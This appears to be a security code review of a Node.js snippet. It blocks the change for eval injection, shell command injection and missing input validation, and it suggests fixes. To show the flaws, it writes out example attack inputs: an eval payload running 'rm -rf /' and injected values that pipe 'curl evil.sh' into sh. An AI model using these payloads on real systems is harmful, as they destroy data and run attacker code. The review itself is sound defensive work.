## Spec alignment
No acceptance criteria provided — N/A.

## Security

**BLOCKING — CWE-95 (Eval Injection, mapped per instructions to CWE-94)**
Quoted evidence: `const payload = eval('(' + req.body + ')');`
`req.body` is untrusted network input concatenated into a string and executed as JavaScript. Any attacker who controls the request body can run arbitrary code in the server process, e.g. body = `1); require('child_process').execSync('rm -rf /'); ({target`.
Fix: replace with `JSON.parse(req.body)` wrapped in try/catch, and validate the resulting shape before use.

**BLOCKING — CWE-78 (OS Command Injection)**
Quoted evidence: `` exec(`deploy.sh ${payload.target}`); ``
`payload.target` is attacker-controlled (derived from the same untrusted body) and is interpolated unsanitized into a shell command string passed to `exec`, which spawns a shell. An attacker can set `target` to `` foo; curl evil.sh | sh `` or `` $(curl evil.sh|sh) `` to execute arbitrary commands.
Fix: use `execFile`/`spawn` with an argument array (`execFile('deploy.sh', [payload.target])`) to avoid shell interpretation, and additionally allowlist/validate `payload.target` against expected values (e.g. known environment names) before use.

**Important — CWE-20 (Improper Input Validation)**
Quoted evidence: same two lines — there is no validation that `payload` is an object or that `payload.target` exists/matches an expected type before it's used to build a command. Combined with the eval/exec chain above, any malformed or hostile body reaches `exec` unchecked.
Fix: after parsing, explicitly validate `typeof payload.target === 'string'` and match against an allowlist/regex before invoking any process.

## Correctness
Both lines are also functionally unsafe independent of security: `eval` will throw on non-expression bodies (unhandled exception/DoS), and there's no error handling around either the parse or the exec call.

## Testability
No tests included in this snippet — nothing to assess.

## Verdict: BLOCK
Two blocking security defects (CWE-95/94 eval injection, CWE-78 command injection) must be fixed before this can be merged.
